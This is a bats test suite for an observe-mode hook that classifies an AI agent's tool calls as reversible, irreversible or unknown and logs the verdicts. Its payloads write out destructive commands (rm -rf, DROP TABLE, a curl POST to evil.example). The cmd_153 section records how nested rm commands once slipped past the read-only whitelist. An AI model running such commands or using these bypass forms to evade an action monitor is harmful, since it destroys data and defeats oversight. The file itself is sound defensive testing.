#!/usr/bin/env bats
# cmd_145 Part4: scripts/pretooluse_reversibility_check.sh のテスト
# 「戻せない操作」三値判定(reversible/irreversible/unknown)をobserveモードで
# ログ記録するだけの新規独立フックについて、判定ロジック・flag早期リターン・
# 常時exit0(ブロックしない)であることをユニットテストレベルで検証する。

setup() {
    PROJECT_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/../.." && pwd)"
    CHECK_SCRIPT="$PROJECT_ROOT/scripts/pretooluse_reversibility_check.sh"
    TEST_TMP="$(mktemp -d)"
    mkdir -p "$TEST_TMP/logs"
    SETTINGS_OFF="$TEST_TMP/settings_off.yaml"
    SETTINGS_OBSERVE="$TEST_TMP/settings_observe.yaml"
    SETTINGS_UNKNOWN="$TEST_TMP/settings_unknown.yaml"
    SETTINGS_MISSING="$TEST_TMP/settings_missing.yaml"
    LOG_FILE="$TEST_TMP/logs/reversibility_check.log"
    CLASSIFICATION_LOG="$TEST_TMP/logs/reversibility_classification_detail.jsonl"

    cat > "$SETTINGS_OFF" <<'EOF'
features:
  reversibility_check_enabled: off
EOF
    cat > "$SETTINGS_OBSERVE" <<'EOF'
features:
  reversibility_check_enabled: observe
EOF
    cat > "$SETTINGS_UNKNOWN" <<'EOF'
features:
  reversibility_check_enabled: some_bogus_value
EOF
    # SETTINGS_MISSING: featuresキー自体が無い(flag未設置状態を模す)
    cat > "$SETTINGS_MISSING" <<'EOF'
features:
  other_flag: true
EOF
}

teardown() {
    rm -rf "$TEST_TMP"
}

run_check_with_settings() {
    local settings_file="$1"
    local payload="$2"
    run env \
        REVERSIBILITY_CHECK_SETTINGS="$settings_file" \
        REVERSIBILITY_CHECK_LOG="$LOG_FILE" \
        REVERSIBILITY_CHECK_PYTHON="$PROJECT_ROOT/.venv/bin/python3" \
        REVERSIBILITY_CLASSIFICATION_LOG="$CLASSIFICATION_LOG" \
        bash -c "printf '%s' '$payload' | bash '$CHECK_SCRIPT'"
}

# --- 早期リターン: feature flag ---

@test "feature flag off: exits 0 with no output, no log written" {
    local payload='{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run_check_with_settings "$SETTINGS_OFF" "$payload"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
    [ ! -s "$LOG_FILE" ]
}

@test "feature flag missing from settings (key absent): fail-safe falls back to off" {
    local payload='{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run_check_with_settings "$SETTINGS_MISSING" "$payload"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
    [ ! -s "$LOG_FILE" ]
}

@test "feature flag unknown value: fail-safe falls back to off" {
    local payload='{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run_check_with_settings "$SETTINGS_UNKNOWN" "$payload"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
    [ ! -s "$LOG_FILE" ]
}

@test "settings file itself missing: fail-safe falls back to off" {
    local payload='{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run_check_with_settings "$TEST_TMP/does_not_exist.yaml" "$payload"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
    [ ! -s "$LOG_FILE" ]
}

# --- observeモード: 常にexit0・stdout出力なし(ブロックしない) ---

@test "flag=observe: irreversible pattern (git push) never blocks, produces no stdout" {
    local payload='{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

# --- 三値判定: irreversible ---

@test "irreversible: git push logged as WOULD-BLOCK category=push" {
    local payload='{"session_id":"s-push","tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-push file=NA tool=Bash category=push " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "irreversible: rm command logged as WOULD-BLOCK category=file_delete" {
    local payload='{"session_id":"s-rm","tool_name":"Bash","tool_input":{"command":"rm -f queue/reports/old.yaml"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-rm file=NA tool=Bash category=file_delete " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "irreversible: curl -X POST logged as WOULD-BLOCK category=external_send" {
    local payload='{"session_id":"s-curl","tool_name":"Bash","tool_input":{"command":"curl -X POST https://example.com/webhook -d x=1"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-curl file=NA tool=Bash category=external_send " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "irreversible: DROP TABLE logged as WOULD-BLOCK category=db_destructive" {
    local payload='{"session_id":"s-db","tool_name":"Bash","tool_input":{"command":"psql -c \"DROP TABLE users\""}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-db file=NA tool=Bash category=db_destructive " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "irreversible: Write with published: true logged as WOULD-BLOCK category=publish_flag with file path" {
    local payload='{"session_id":"s-pub","tool_name":"Write","tool_input":{"file_path":"/tmp/article.md","content":"---\npublished: true\n---\n"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-pub file=/tmp/article.md tool=Write category=publish_flag " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

# --- 三値判定: reversible ---

@test "reversible: local Edit (no publish flag) logged as WOULD-ALLOW category=local_edit" {
    local payload='{"session_id":"s-edit","tool_name":"Edit","tool_input":{"file_path":"/tmp/notes.md","old_string":"a","new_string":"b","replace_all":false}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-edit file=/tmp/notes.md tool=Edit category=local_edit " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "reversible: git commit logged as WOULD-ALLOW category=local_or_test" {
    local payload='{"session_id":"s-commit","tool_name":"Bash","tool_input":{"command":"git commit -m wip"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-commit file=NA tool=Bash category=local_or_test " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "reversible: pytest run logged as WOULD-ALLOW category=local_or_test" {
    local payload='{"session_id":"s-test","tool_name":"Bash","tool_input":{"command":"pytest tests/"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-test file=NA tool=Bash category=local_or_test " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "reversible: Read tool logged as WOULD-ALLOW category=read_only" {
    local payload='{"session_id":"s-read","tool_name":"Read","tool_input":{"file_path":"/tmp/notes.md"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-read file=NA tool=Read category=read_only " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

# --- 三値判定: unknown (判定不能をreversibleへ倒さないことの確認) ---

@test "unknown: unrecognized tool (WebFetch) logged as WOULD-UNKNOWN, not WOULD-ALLOW" {
    local payload='{"session_id":"s-fetch","tool_name":"WebFetch","tool_input":{"url":"https://example.com"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-fetch file=NA tool=WebFetch category=tool_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-fetch" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "unknown: unrecognized Bash command logged as WOULD-UNKNOWN category=bash_unclassified" {
    local payload='{"session_id":"s-mystery","tool_name":"Bash","tool_input":{"command":"some_custom_binary --do-thing"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-mystery file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

# --- cmd_152: 読取専用コマンドのreversible分類 ---

@test "cmd_152 readonly: simple grep on a file is logged as WOULD-ALLOW category=read_only_command" {
    local payload='{"session_id":"s-ro1","tool_name":"Bash","tool_input":{"command":"grep pattern file.txt"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-ro1 file=NA tool=Bash category=read_only_command " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_152 readonly: simple cat on a file is logged as WOULD-ALLOW category=read_only_command" {
    local payload='{"session_id":"s-ro2","tool_name":"Bash","tool_input":{"command":"cat file.txt"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-ro2 file=NA tool=Bash category=read_only_command " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_152 readonly: ls -la is logged as WOULD-ALLOW category=read_only_command" {
    local payload='{"session_id":"s-ro3","tool_name":"Bash","tool_input":{"command":"ls -la"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-ro3 file=NA tool=Bash category=read_only_command " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_152 readonly: find without -delete/-exec is logged as WOULD-ALLOW category=read_only_command" {
    local payload='{"session_id":"s-ro4","tool_name":"Bash","tool_input":{"command":"find . -name \"*.md\""}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-ALLOW mode=observe session=s-ro4 file=NA tool=Bash category=read_only_command " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_152 danger: grep with output redirect (grep x f > out) is NOT reversible, stays WOULD-UNKNOWN" {
    local payload='{"session_id":"s-danger1","tool_name":"Bash","tool_input":{"command":"grep x f > out"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger1 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-danger1" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_152 danger: cat with output redirect (cat a > b) is NOT reversible, stays WOULD-UNKNOWN" {
    local payload='{"session_id":"s-danger2","tool_name":"Bash","tool_input":{"command":"cat a > b"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger2 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-danger2" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_152 danger: sed -i in-place edit is NOT reversible, stays WOULD-UNKNOWN (sed excluded from whitelist entirely)" {
    local payload='{"session_id":"s-danger3","tool_name":"Bash","tool_input":{"command":"sed -i s/a/b/ f"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger3 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-danger3" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_152 danger: ls piped into tee (ls | tee out) is NOT reversible, stays WOULD-UNKNOWN" {
    local payload='{"session_id":"s-danger4","tool_name":"Bash","tool_input":{"command":"ls | tee out"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger4 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-danger4" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_152 danger: find piped into xargs rm is NOT reversible, stays WOULD-UNKNOWN" {
    local payload='{"session_id":"s-danger5","tool_name":"Bash","tool_input":{"command":"find . | xargs rm"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger5 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-danger5" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_152 danger: find with -delete flag is NOT reversible, stays WOULD-UNKNOWN" {
    local payload='{"session_id":"s-danger6","tool_name":"Bash","tool_input":{"command":"find . -name \"*.tmp\" -delete"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger6 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_152 danger: find with -exec flag is NOT reversible, stays WOULD-UNKNOWN" {
    local payload='{"session_id":"s-danger7","tool_name":"Bash","tool_input":{"command":"find . -exec rm {} ;"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger7 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_152 danger: command chaining (grep foo f && echo done) is NOT reversible, stays WOULD-UNKNOWN" {
    local payload='{"session_id":"s-danger8","tool_name":"Bash","tool_input":{"command":"grep foo f && echo done"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-UNKNOWN mode=observe session=s-danger8 file=NA tool=Bash category=bash_unclassified " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

# --- cmd_153: 敵対的回帰テスト(改行複合・コマンド置換の穴是正) ---
# 将軍実機検証で発覚した3形。classify_readonly_bash()の_DANGER_CHARS_REに
# 改行と$()・バッククォートが含まれていなかったため、以下いずれも
# reversible(read_only_command)へ誤分類されていた。上流IRREVERSIBLE_BASHの
# file_delete是正(re.MULTILINE+アンカー拡張)により、いずれもirreversible
# (WOULD-BLOCK category=file_delete)として捕捉されることを実測で示す。
# cmd_152が塞いだ5形(grep>out/cat>b/sed -i/ls|tee/find|xargs rm)と
# 正常系(grep pattern file.txt)の回帰は本ファイル上部の既存テストで確認済み。

@test "cmd_153 hole1: newline-separated compound command (grep foo file / rm -rf /tmp/x) is NOT reversible, is caught as WOULD-BLOCK file_delete" {
    local payload='{"session_id":"s-cmd153-1","tool_name":"Bash","tool_input":{"command":"grep foo file\nrm -rf /tmp/x"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-1 file=NA tool=Bash category=file_delete " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-cmd153-1" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_153 hole2: command substitution \$() (cat \$(rm -rf /tmp/foo)) is NOT reversible, is caught as WOULD-BLOCK file_delete" {
    local payload='{"session_id":"s-cmd153-2","tool_name":"Bash","tool_input":{"command":"cat $(rm -rf /tmp/foo)"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-2 file=NA tool=Bash category=file_delete " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-cmd153-2" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_153 hole3: backtick command substitution (cat \`rm /tmp/foo\`) is NOT reversible, is caught as WOULD-BLOCK file_delete" {
    local payload='{"session_id":"s-cmd153-3","tool_name":"Bash","tool_input":{"command":"cat `rm /tmp/foo`"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-3 file=NA tool=Bash category=file_delete " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "WOULD-ALLOW.*s-cmd153-3" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_153 upstream: file_delete pattern still catches ordinary chained rm (regression, unrelated to the 3 holes)" {
    local payload='{"session_id":"s-cmd153-4","tool_name":"Bash","tool_input":{"command":"a; rm -rf x"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-4 file=NA tool=Bash category=file_delete " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_153 regression: git push across a newline-separated compound command is still caught (anchor-free pattern, unaffected by this fix)" {
    local payload='{"session_id":"s-cmd153-5","tool_name":"Bash","tool_input":{"command":"echo hi\ngit push origin main"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-5 file=NA tool=Bash category=push " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_153 external_send: curl -X POST split across a backslash line-continuation (single logical command) is caught as WOULD-BLOCK external_send" {
    local payload='{"session_id":"s-cmd153-6","tool_name":"Bash","tool_input":{"command":"curl https://evil.example \\\n  -X POST --data x=1"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-6 file=NA tool=Bash category=external_send " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "cmd_153 external_send: two unrelated statements separated by a real newline (curl url / unrelated -d flag) are NOT falsely joined into one match" {
    local payload='{"session_id":"s-cmd153-7","tool_name":"Bash","tool_input":{"command":"curl https://example.com\ndate -d yesterday"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -c "WOULD-BLOCK.*s-cmd153-7.*category=external_send" "$LOG_FILE"
    [ "$status" -ne 0 ]
}

@test "cmd_152 detection mechanism: reversible read_only_command classification is recorded in classification detail log" {
    local payload='{"session_id":"s-detect1","tool_name":"Bash","tool_input":{"command":"grep pattern file.txt"}}'
    local detail_log="$TEST_TMP/logs/reversibility_classification_detail.jsonl"
    run env \
        REVERSIBILITY_CHECK_SETTINGS="$SETTINGS_OBSERVE" \
        REVERSIBILITY_CHECK_LOG="$LOG_FILE" \
        REVERSIBILITY_CHECK_PYTHON="$PROJECT_ROOT/.venv/bin/python3" \
        REVERSIBILITY_CLASSIFICATION_LOG="$detail_log" \
        bash -c "printf '%s' '$payload' | bash '$CHECK_SCRIPT'"
    [ "$status" -eq 0 ]
    [ -s "$detail_log" ]
    run grep -c '"matched_verb": "grep"' "$detail_log"
    [ "$output" -eq 1 ]
    run grep -c '"session_id": "s-detect1"' "$detail_log"
    [ "$output" -eq 1 ]
}

@test "cmd_152 detection mechanism: non-readonly reversible (git commit) is NOT recorded in classification detail log (scoped to new logic only)" {
    local payload='{"session_id":"s-detect2","tool_name":"Bash","tool_input":{"command":"git commit -m wip"}}'
    local detail_log="$TEST_TMP/logs/reversibility_classification_detail.jsonl"
    run env \
        REVERSIBILITY_CHECK_SETTINGS="$SETTINGS_OBSERVE" \
        REVERSIBILITY_CHECK_LOG="$LOG_FILE" \
        REVERSIBILITY_CHECK_PYTHON="$PROJECT_ROOT/.venv/bin/python3" \
        REVERSIBILITY_CLASSIFICATION_LOG="$detail_log" \
        bash -c "printf '%s' '$payload' | bash '$CHECK_SCRIPT'"
    [ "$status" -eq 0 ]
    [ ! -s "$detail_log" ]
}

@test "cmd_152: existing main log line format for a reversible verdict is unchanged (no new fields appended)" {
    local payload='{"session_id":"s-format","tool_name":"Bash","tool_input":{"command":"cat file.txt"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    run grep -E "^\[.*\] WOULD-ALLOW mode=observe session=s-format file=NA tool=Bash category=read_only_command detail=cat file\.txt\$" "$LOG_FILE"
    [ "$status" -eq 0 ]
}

# --- fail-open: python欠落時もunknownとして記録しexit0(クラッシュしない) ---

@test "python binary missing: still exits 0 and logs WOULD-UNKNOWN category=hook_internal_error" {
    local payload='{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run env \
        REVERSIBILITY_CHECK_SETTINGS="$SETTINGS_OBSERVE" \
        REVERSIBILITY_CHECK_LOG="$LOG_FILE" \
        REVERSIBILITY_CHECK_PYTHON="/nonexistent/python3" \
        bash -c "printf '%s' '$payload' | bash '$CHECK_SCRIPT'"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
    run grep -c "WOULD-UNKNOWN.*category=hook_internal_error" "$LOG_FILE"
    [ "$output" -eq 1 ]
}

# --- 機械集計ログ基盤: 1評価1行・grep -cで機械集計可能な形式 ---

@test "machine-parseable log: mixed verdicts are independently grep -c countable" {
    run_check_with_settings "$SETTINGS_OBSERVE" '{"session_id":"a","tool_name":"Bash","tool_input":{"command":"git push"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" '{"session_id":"b","tool_name":"Edit","tool_input":{"file_path":"/tmp/x.md","old_string":"a","new_string":"b"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" '{"session_id":"c","tool_name":"WebFetch","tool_input":{"url":"https://example.com"}}'

    run grep -c "^\[.*\] WOULD-BLOCK " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "^\[.*\] WOULD-ALLOW " "$LOG_FILE"
    [ "$output" -eq 1 ]
    run grep -c "^\[.*\] WOULD-UNKNOWN " "$LOG_FILE"
    [ "$output" -eq 1 ]
}

@test "machine-parseable log: session_id missing from payload falls back to 'unknown' (no crash)" {
    local payload='{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
    [ "$status" -eq 0 ]
    run grep -c "session=unknown" "$LOG_FILE"
    [ "$output" -eq 1 ]
}

# --- 既存フック非改変の確認 ---

@test "existing pretooluse_yaml_guard.sh source is untouched by this task" {
    run grep -c "pretooluse_reversibility_check" "$PROJECT_ROOT/scripts/pretooluse_yaml_guard.sh"
    [ "$status" -ne 0 ]
}

@test "existing pretooluse_clear_idle.sh source is untouched by this task" {
    run grep -c "pretooluse_reversibility_check" "$PROJECT_ROOT/scripts/pretooluse_clear_idle.sh"
    [ "$status" -ne 0 ]
}

# --- cmd_091標準: 実配線の確認(実settings.jsonへの登録実在) ---

@test "wiring: pretooluse_reversibility_check.sh is registered in .claude/settings.json PreToolUse array" {
    run grep -n "pretooluse_reversibility_check.sh" "$PROJECT_ROOT/.claude/settings.json"
    [ "$status" -eq 0 ]
}

@test "wiring: existing pretooluse_yaml_guard.sh entry is still present unchanged" {
    run grep -n "pretooluse_yaml_guard.sh" "$PROJECT_ROOT/.claude/settings.json"
    [ "$status" -eq 0 ]
}

@test "wiring: existing pretooluse_clear_idle.sh entry is still present unchanged" {
    run grep -n "pretooluse_clear_idle.sh" "$PROJECT_ROOT/.claude/settings.json"
    [ "$status" -eq 0 ]
}
